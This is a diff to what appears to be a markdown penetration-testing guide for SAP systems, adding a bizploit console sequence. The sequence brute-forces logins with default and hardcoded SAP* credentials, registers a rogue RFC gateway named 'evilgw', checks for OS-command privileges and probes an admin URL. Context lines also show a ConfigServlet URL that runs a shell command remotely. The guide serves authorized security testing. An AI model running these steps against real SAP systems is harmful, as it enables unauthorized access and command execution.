@@ -170,7 +170,28 @@ Matching Modules
 ```
 http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
 ```
-
+- Before running the ```start``` on the bizploit script on the Discovery phase, you can also add the following for performing vulnerability assessment after discovering some endpoints (from davehardy):
+```
+bizploit> plugins
+bizploit/plugins> vulnassess all
+bizploit/plugins> vulnassess config bruteLogin
+bizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers
+bizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True
+bizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True
+bizploit/plugins/vulnassess/config:bruteLogin> back
+bizploit/plugins> vulnassess config registerExtServer
+bizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw
+bizploit/plugins/vulnassess/config:registerExtServer> back
+bizploit/plugins> vulnassess config checkRFCPrivs
+bizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True
+bizploit/plugins/vulnassess/config:checkRFCPrivs> back
+bizploit/plugins> vulnassess config icmAdmin
+bizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin
+bizploit/plugins/vulnassess/config:icmAdmin> back
+bizploit/plugins> start
+bizploit/plugins> back
+bizploit> start
+```
 ## References
 - [SAP Penetration Testing Using Metasploit](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
 - https://github.com/davehardy20/SAP-Stuff - a script to semi-automate Bizploit
